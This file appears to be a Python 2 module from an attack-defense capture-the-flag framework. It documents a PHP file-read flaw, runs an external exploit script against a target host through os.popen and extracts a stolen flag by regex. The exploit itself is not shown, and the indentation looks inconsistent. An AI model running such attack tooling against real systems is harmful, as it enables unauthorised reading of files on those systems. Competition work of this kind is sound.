#!/usr/bin/env python

import requests,re,os
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		data = cmd
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
		res = shit(target,target_port,data)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
                if len(res)==60:
                    res = cmd_prefix + res + cmd_postfix
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res

def shit(target,target_port,cmd):
	res = os.popen('python2 pwn_2.py  %s'%(target)).read()
	
	if re.search('[0-9a-zA-Z]{60}',res):
		res = re.search('[0-9a-zA-Z]{60}',res).group()
		print res
	return res

if __name__ == '__main__':
	shit('127.0.0.1',80,'whoami')
